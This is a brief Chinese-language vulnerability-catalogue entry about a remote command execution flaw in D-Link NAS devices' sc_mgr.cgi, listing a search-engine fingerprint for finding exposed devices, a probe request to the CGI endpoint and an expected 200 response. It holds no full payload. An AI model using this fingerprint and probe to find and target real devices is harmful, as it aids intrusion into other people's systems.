# D-LinkNAS设备sc_mgr.cgi存在RCE命令执行漏洞

D-LinkNAS ｜ 命令执行 ｜ —
- **指纹**：`app="D_Link-DNS-ShareCenter"`
- **请求**：`GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1`
- **响应特征**：200